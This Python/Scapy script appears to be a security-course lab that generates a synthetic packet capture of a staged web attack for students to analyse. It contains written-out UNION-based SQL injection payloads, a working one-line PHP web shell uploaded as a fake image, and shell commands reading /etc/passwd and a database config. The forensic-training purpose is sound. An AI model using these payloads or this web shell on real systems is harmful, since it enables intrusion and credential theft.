#!/usr/bin/env python3
"""
MAR404 - Clase 3 - Lab 6
Genera un PCAP con tráfico HTTP que simula una cadena de ataque web:
1. Reconocimiento (browsing normal de la app)
2. SQL Injection (UNION-based) para extraer credenciales
3. File Upload del web shell
4. Uso del web shell para ejecutar comandos

El estudiante debe reconstruir la cadena de ataque completa.
"""

from scapy.all import *
from scapy.layers.inet import IP, TCP
import random
import urllib.parse
import os

OUTPUT_FILE = "/pcap/web_attack_lab.pcap"

# Configuración
ATTACKER_IP = "192.168.1.100"
WEB_SERVER_IP = "10.0.1.20"
WEB_SERVER_PORT = 80


def make_http_request(src, dst, sport, method, uri, host, ua, body=None, content_type=None):
    """Construye un paquete HTTP request."""
    headers = f"{method} {uri} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
    if content_type:
        headers += f"Content-Type: {content_type}\r\n"
    if body:
        headers += f"Content-Length: {len(body)}\r\n"
    headers += "Connection: keep-alive\r\n\r\n"
    if body:
        headers += body
    
    return IP(src=src, dst=dst) / TCP(sport=sport, dport=WEB_SERVER_PORT, flags='PA',
              seq=random.randint(1000, 50000), ack=random.randint(1000, 50000)) / Raw(load=headers.encode())


def make_http_response(src, dst, sport, dport, status, body, content_type="text/html"):
    """Construye un paquete HTTP response."""
    resp = (f"HTTP/1.1 {status}\r\n"
            f"Server: Apache/2.4.52 (Ubuntu)\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{body}")
    
    return IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags='PA',
              seq=random.randint(1000, 50000), ack=random.randint(1000, 50000)) / Raw(load=resp.encode())


def generate_pcap():
    all_packets = []
    host = "shop.empresa-ejemplo.cl"
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0"
    
    # ========================================
    # FASE 1: Reconocimiento (navegación normal)
    # ========================================
    print("[+] Fase 1: Reconocimiento...")
    
    normal_pages = [
        ("/", "<html><body><h1>Shop Online</h1><a href='/products'>Products</a></body></html>"),
        ("/products", "<html><body><h1>Products</h1><a href='/products/search?id=1'>Item 1</a></body></html>"),
        ("/products/search?id=1", "<html><body><h1>Product: Laptop Pro</h1><p>Price: $999</p></body></html>"),
        ("/products/search?id=2", "<html><body><h1>Product: Wireless Mouse</h1><p>Price: $29</p></body></html>"),
        ("/about", "<html><body><h1>About Us</h1><p>Company info</p></body></html>"),
        ("/contact", "<html><body><h1>Contact</h1><form method='POST'></form></body></html>"),
    ]
    
    for uri, body in normal_pages:
        sport = random.randint(49152, 65535)
        req = make_http_request(ATTACKER_IP, WEB_SERVER_IP, sport, "GET", uri, host, ua)
        resp = make_http_response(WEB_SERVER_IP, ATTACKER_IP, WEB_SERVER_PORT, sport, "200 OK", body)
        all_packets.extend([req, resp])
    
    # ========================================
    # FASE 2: SQL Injection (probing + exploitation)
    # ========================================
    print("[+] Fase 2: SQL Injection...")
    
    # Probing SQLi
    sqli_probes = [
        ("/products/search?id=1'", "500 Internal Server Error",
         "<html><body>Error: You have an error in your SQL syntax near '''</body></html>"),
        ("/products/search?id=1' OR '1'='1", "200 OK",
         "<html><body><h1>Product: Laptop Pro</h1><h1>Product: Wireless Mouse</h1><h1>Product: Keyboard</h1></body></html>"),
        ("/products/search?id=1' ORDER BY 5--", "200 OK",
         "<html><body><h1>Product: Laptop Pro</h1></body></html>"),
        ("/products/search?id=1' ORDER BY 6--", "500 Internal Server Error",
         "<html><body>Error: Unknown column '6' in 'order clause'</body></html>"),
    ]
    
    for uri, status, body in sqli_probes:
        sport = random.randint(49152, 65535)
        encoded_uri = uri.replace("'", "%27").replace(" ", "%20")
        req = make_http_request(ATTACKER_IP, WEB_SERVER_IP, sport, "GET", encoded_uri, host, ua)
        resp = make_http_response(WEB_SERVER_IP, ATTACKER_IP, WEB_SERVER_PORT, sport, status, body)
        all_packets.extend([req, resp])
    
    # Exploitation - Extract credentials
    sqli_exploits = [
        ("/products/search?id=1' UNION SELECT username,password,3,4,5 FROM users--", "200 OK",
         "<html><body><h1>admin</h1><p>$2b$12$LJ3m4sMKfEzH8YX9kGz5QeKx8v2nZpR4</p>"
         "<h1>editor</h1><p>$2b$12$9Xk2mVpQwR3tY7uI8oP0LeAsDfGhJkLm</p>"
         "<h1>upload_svc</h1><p>Upload2026!</p></body></html>"),
        ("/products/search?id=1' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--", "200 OK",
         "<html><body><h1>users</h1><h1>products</h1><h1>orders</h1><h1>sessions</h1></body></html>"),
    ]
    
    for uri, status, body in sqli_exploits:
        sport = random.randint(49152, 65535)
        encoded_uri = urllib.parse.quote(uri, safe='/:?=&')
        req = make_http_request(ATTACKER_IP, WEB_SERVER_IP, sport, "GET", encoded_uri, host, ua)
        resp = make_http_response(WEB_SERVER_IP, ATTACKER_IP, WEB_SERVER_PORT, sport, status, body)
        all_packets.extend([req, resp])
    
    # ========================================
    # FASE 3: File Upload (web shell)
    # ========================================
    print("[+] Fase 3: File Upload (web shell)...")
    
    # Login con credenciales robadas
    sport = random.randint(49152, 65535)
    login_body = "username=upload_svc&password=Upload2026!"
    req = make_http_request(ATTACKER_IP, WEB_SERVER_IP, sport, "POST", "/admin/login", host, ua,
                           body=login_body, content_type="application/x-www-form-urlencoded")
    resp = make_http_response(WEB_SERVER_IP, ATTACKER_IP, WEB_SERVER_PORT, sport, "302 Found",
                             "Redirecting to /admin/dashboard")
    all_packets.extend([req, resp])
    
    # Upload del web shell
    sport = random.randint(49152, 65535)
    webshell_content = '<?php if(isset($_POST["cmd"])){echo "<pre>".shell_exec($_POST["cmd"])."</pre>";}?>'
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    upload_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="img_2026.php"\r\n'
        f"Content-Type: image/jpeg\r\n\r\n"
        f"{webshell_content}\r\n"
        f"--{boundary}--\r\n"
    )
    req = make_http_request(ATTACKER_IP, WEB_SERVER_IP, sport, "POST", "/admin/upload", host, ua,
                           body=upload_body, content_type=f"multipart/form-data; boundary={boundary}")
    resp = make_http_response(WEB_SERVER_IP, ATTACKER_IP, WEB_SERVER_PORT, sport, "200 OK",
                             '{"status":"success","path":"/uploads/img_2026.php"}')
    all_packets.extend([req, resp])
    
    # ========================================
    # FASE 4: Web Shell Usage
    # ========================================
    print("[+] Fase 4: Uso del web shell...")
    
    shell_commands = [
        ("whoami", "www-data"),
        ("id", "uid=33(www-data) gid=33(www-data) groups=33(www-data)"),
        ("uname -a", "Linux webserver 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"),
        ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL:/var/lib/mysql:/bin/false"),
        ("ls -la /var/www/html/", "total 48\ndrwxr-xr-x 5 www-data www-data 4096 Jul  3 08:30 .\n-rw-r--r-- 1 www-data www-data 2048 Jul  1 10:00 index.php\ndrwxr-xr-x 2 www-data www-data 4096 Jul  3 08:35 uploads"),
        ("cat /var/www/html/config/database.php", "<?php\n$db_host = 'localhost';\n$db_user = 'shop_user';\n$db_pass = 'Sh0p_DB_2026!';\n$db_name = 'shop_production';\n?>"),
        ("netstat -tlnp", "tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 1234/apache2\ntcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 5678/mysqld\ntcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 910/sshd"),
    ]
    
    for cmd, output in shell_commands:
        sport = random.randint(49152, 65535)
        post_body = f"cmd={urllib.parse.quote(cmd)}"
        req = make_http_request(ATTACKER_IP, WEB_SERVER_IP, sport, "POST", "/uploads/img_2026.php", host, ua,
                               body=post_body, content_type="application/x-www-form-urlencoded")
        resp_body = f"<pre>{output}</pre>"
        resp = make_http_response(WEB_SERVER_IP, ATTACKER_IP, WEB_SERVER_PORT, sport, "200 OK", resp_body)
        all_packets.extend([req, resp])
    
    # ========================================
    # Guardar PCAP
    # ========================================
    print(f"[+] Total paquetes: {len(all_packets)}")
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    wrpcap(OUTPUT_FILE, all_packets)
    print(f"[+] PCAP guardado en {OUTPUT_FILE}")
    print("[+] Lab 6 listo para análisis")


if __name__ == "__main__":
    generate_pcap()
